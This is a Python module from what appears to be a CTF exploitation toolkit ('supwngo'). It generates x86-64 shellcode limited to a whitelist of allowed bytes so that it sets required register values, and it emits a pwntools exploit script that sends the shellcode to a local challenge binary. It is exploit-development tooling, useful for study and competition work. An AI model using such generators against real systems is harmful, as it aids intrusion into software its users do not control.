"""
Restricted Shellcode Module - Handle byte-constrained shellcode challenges.

For challenges that:
1. Execute user input as code
2. Validate input against a whitelist of allowed bytes
3. Require setting specific register values
4. Have limited shellcode space

This module analyzes allowed bytes and generates valid shellcode.
"""

import struct
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class ShellcodeConstraints:
    """Constraints for shellcode generation."""
    allowed_bytes: Set[int] = field(default_factory=set)
    bad_bytes: Set[int] = field(default_factory=set)
    max_length: int = 256
    required_registers: Dict[str, int] = field(default_factory=dict)
    must_return: bool = True
    arch: str = "amd64"


@dataclass
class InstructionEncoding:
    """Information about an x86-64 instruction encoding."""
    mnemonic: str
    operands: str
    bytes: bytes
    is_valid: bool = True


class RestrictedShellcodeGenerator:
    """
    Generate shellcode that satisfies byte constraints.

    Analyzes allowed bytes to determine which instructions are available
    and builds shellcode using only those instructions.
    """

    # Common x86-64 instruction byte patterns
    # Format: (opcode_bytes, mnemonic_pattern)
    X64_MOV_REG_IMM = {
        # mov r64, imm64 (REX.W + B8+rd)
        'rax': (b'\x48\xb8', 10),  # REX.W + mov rax, imm64
        'rcx': (b'\x48\xb9', 10),
        'rdx': (b'\x48\xba', 10),
        'rbx': (b'\x48\xbb', 10),
        'rsp': (b'\x48\xbc', 10),
        'rbp': (b'\x48\xbd', 10),
        'rsi': (b'\x48\xbe', 10),
        'rdi': (b'\x48\xbf', 10),
        'r8':  (b'\x49\xb8', 10),  # REX.WB + mov r8, imm64
        'r9':  (b'\x49\xb9', 10),
        'r10': (b'\x49\xba', 10),
        'r11': (b'\x49\xbb', 10),
        'r12': (b'\x49\xbc', 10),
        'r13': (b'\x49\xbd', 10),
        'r14': (b'\x49\xbe', 10),
        'r15': (b'\x49\xbf', 10),
    }

    # mov r64, imm32 (sign-extended) - shorter encoding
    X64_MOV_REG_IMM32 = {
        'rax': (b'\x48\xc7\xc0', 7),  # mov rax, imm32
        'rcx': (b'\x48\xc7\xc1', 7),
        'rdx': (b'\x48\xc7\xc2', 7),
        'rbx': (b'\x48\xc7\xc3', 7),
        'rsp': (b'\x48\xc7\xc4', 7),
        'rbp': (b'\x48\xc7\xc5', 7),
        'rsi': (b'\x48\xc7\xc6', 7),
        'rdi': (b'\x48\xc7\xc7', 7),
        'r8':  (b'\x49\xc7\xc0', 7),
        'r9':  (b'\x49\xc7\xc1', 7),
        'r10': (b'\x49\xc7\xc2', 7),
        'r11': (b'\x49\xc7\xc3', 7),
        'r12': (b'\x49\xc7\xc4', 7),
        'r13': (b'\x49\xc7\xc5', 7),
        'r14': (b'\x49\xc7\xc6', 7),
        'r15': (b'\x49\xc7\xc7', 7),
    }

    def __init__(self, constraints: ShellcodeConstraints):
        """Initialize with constraints."""
        self.constraints = constraints
        self.available_instructions: List[str] = []

    def analyze_available_instructions(self) -> List[str]:
        """Analyze which instructions are available given allowed bytes."""
        available = []
        allowed = self.constraints.allowed_bytes

        # Check for ret (0xc3)
        if 0xc3 in allowed:
            available.append("ret")

        # Check for syscall (0x0f 0x05)
        if 0x0f in allowed and 0x05 in allowed:
            available.append("syscall")

        # Check for each register's MOV encoding
        for reg, (opcode, length) in self.X64_MOV_REG_IMM32.items():
            if all(b in allowed for b in opcode):
                available.append(f"mov {reg}, imm32")

        for reg, (opcode, length) in self.X64_MOV_REG_IMM.items():
            if all(b in allowed for b in opcode):
                available.append(f"mov {reg}, imm64")

        # Check for xor reg, reg patterns
        if 0x48 in allowed and 0x31 in allowed:
            available.append("xor r64, r64 (various)")
        if 0x49 in allowed and 0x31 in allowed:
            available.append("xor r8-r15, r64")

        # Check for push/pop
        for reg_num in range(8):
            push_byte = 0x50 + reg_num
            pop_byte = 0x58 + reg_num
            if push_byte in allowed:
                available.append(f"push {['rax','rcx','rdx','rbx','rsp','rbp','rsi','rdi'][reg_num]}")
            if pop_byte in allowed:
                available.append(f"pop {['rax','rcx','rdx','rbx','rsp','rbp','rsi','rdi'][reg_num]}")

        self.available_instructions = available
        return available

    def can_encode_value(self, value: int) -> bool:
        """Check if a 32-bit value can be encoded with allowed bytes."""
        value_bytes = struct.pack('<I', value & 0xFFFFFFFF)
        return all(b in self.constraints.allowed_bytes for b in value_bytes)

    def generate_mov_reg(self, reg: str, value: int) -> Optional[bytes]:
        """Generate MOV instruction for register with value, if possible."""
        allowed = self.constraints.allowed_bytes

        # Try 32-bit encoding first (shorter)
        if value <= 0x7FFFFFFF:  # Fits in signed 32-bit
            if reg in self.X64_MOV_REG_IMM32:
                opcode, length = self.X64_MOV_REG_IMM32[reg]
                if all(b in allowed for b in opcode):
                    value_bytes = struct.pack('<I', value)
                    if all(b in allowed for b in value_bytes):
                        return opcode + value_bytes

        # Try 64-bit encoding
        if reg in self.X64_MOV_REG_IMM:
            opcode, length = self.X64_MOV_REG_IMM[reg]
            if all(b in allowed for b in opcode):
                value_bytes = struct.pack('<Q', value)
                if all(b in allowed for b in value_bytes):
                    return opcode + value_bytes

        return None

    def generate_register_setup(self) -> Optional[bytes]:
        """Generate shellcode to set required register values."""
        if not self.constraints.required_registers:
            return b""

        shellcode = b""

        for reg, value in self.constraints.required_registers.items():
            mov_bytes = self.generate_mov_reg(reg, value)
            if mov_bytes is None:
                logger.warning(f"Cannot encode mov {reg}, {hex(value)} with allowed bytes")
                return None
            shellcode += mov_bytes

            if len(shellcode) > self.constraints.max_length:
                logger.warning(f"Shellcode exceeds max length {self.constraints.max_length}")
                return None

        return shellcode

    def generate_shellcode(self) -> Optional[bytes]:
        """Generate complete shellcode satisfying constraints."""
        shellcode = b""

        # Set up required registers
        reg_setup = self.generate_register_setup()
        if reg_setup is None:
            return None
        shellcode += reg_setup

        # Add return if required
        if self.constraints.must_return:
            if 0xc3 not in self.constraints.allowed_bytes:
                logger.warning("ret (0xc3) not in allowed bytes but return required")
                return None
            shellcode += b'\xc3'

        if len(shellcode) > self.constraints.max_length:
            return None

        return shellcode

    def verify_shellcode(self, shellcode: bytes) -> bool:
        """Verify shellcode uses only allowed bytes."""
        return all(b in self.constraints.allowed_bytes for b in shellcode)


def detect_shellcode_constraints(binary) -> Optional[ShellcodeConstraints]:
    """
    Detect shellcode constraints from binary analysis.

    Looks for:
    - Byte whitelist arrays in data section
    - Comparison loops that validate input
    - Register comparison checks
    """
    constraints = ShellcodeConstraints()

    try:
        # Look for byte arrays in .data/.rodata sections
        data = b""
        for section in binary.sections.values():
            if section.name in ['.data', '.rodata', '.init_array']:
                try:
                    data += binary._elf.read(section.address, section.size)
                except Exception:
                    pass

        # Look for patterns that suggest allowed bytes
        # Common pattern: array of allowed byte values
        # Often near strings like "allowed" or "valid"

        # Try to find register targets in data
        # Often stored as pairs: (register_index, expected_value)

    except Exception as e:
        logger.debug(f"Constraint detection failed: {e}")

    return constraints


def generate_restricted_shellcode(
    allowed_bytes: Set[int],
    required_registers: Dict[str, int] = None,
    max_length: int = 256,
    must_return: bool = True,
) -> Optional[bytes]:
    """
    Convenience function to generate restricted shellcode.

    Args:
        allowed_bytes: Set of byte values that can be used
        required_registers: Dict mapping register names to required values
        max_length: Maximum shellcode length
        must_return: Whether shellcode must end with ret

    Returns:
        Shellcode bytes if successful, None otherwise
    """
    constraints = ShellcodeConstraints(
        allowed_bytes=allowed_bytes,
        max_length=max_length,
        required_registers=required_registers or {},
        must_return=must_return,
    )

    generator = RestrictedShellcodeGenerator(constraints)
    available = generator.analyze_available_instructions()
    logger.info(f"Available instructions: {available}")

    shellcode = generator.generate_shellcode()
    if shellcode:
        logger.info(f"Generated {len(shellcode)} byte shellcode")
        logger.debug(f"Shellcode: {shellcode.hex()}")

    return shellcode


def generate_exploit_for_reconstruction_style(
    allowed_bytes: Set[int],
    register_values: Dict[str, int],
    max_length: int = 60,
) -> str:
    """
    Generate exploit script for reconstruction-style challenges.

    These challenges:
    1. Take shellcode input
    2. Validate bytes against whitelist
    3. Execute shellcode
    4. Check if registers have expected values

    Args:
        allowed_bytes: Set of allowed byte values
        register_values: Dict mapping register names to required values
        max_length: Maximum shellcode length

    Returns:
        Python exploit script
    """
    shellcode = generate_restricted_shellcode(
        allowed_bytes=allowed_bytes,
        required_registers=register_values,
        max_length=max_length,
        must_return=True,
    )

    allowed_hex = ', '.join(f'0x{b:02x}' for b in sorted(allowed_bytes))
    reg_values_str = ', '.join(f'{r}: {hex(v)}' for r, v in register_values.items())

    if shellcode:
        shellcode_hex = shellcode.hex()
        status = "# Shellcode generated successfully!"
    else:
        shellcode_hex = "# FAILED - Could not generate valid shellcode"
        status = "# ERROR: Unable to generate shellcode with given constraints"

    return f'''#!/usr/bin/env python3
"""
Restricted Shellcode Exploit
Generated by supwngo

{status}

Constraints:
  Allowed bytes: [{allowed_hex}]
  Required registers: {{{reg_values_str}}}
  Max length: {max_length}
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Allowed bytes (for verification)
allowed = set([{allowed_hex}])

# Required register values
required = {{
{chr(10).join(f"    '{r}': {hex(v)}," for r, v in register_values.items())}
}}

# Generated shellcode
shellcode = bytes.fromhex("{shellcode_hex}")

# Verify all bytes are allowed
valid = all(b in allowed for b in shellcode)
if not valid:
    bad = [f"0x{{b:02x}}" for b in shellcode if b not in allowed]
    log.error(f"Bad bytes: {{', '.join(bad)}}")
    exit(1)

log.success(f"Shellcode length: {{len(shellcode)}} bytes")
log.success(f"All bytes valid!")

# Run exploit
io = process("./binary")  # CHANGE THIS

# Send trigger command if needed (e.g., "fix" for reconstruction)
# io.sendlineafter(b">>> ", b"fix")

# Wait for shellcode prompt
# io.recvuntil(b":")

# Send shellcode
io.send(shellcode)

# Get result
io.interactive()
'''
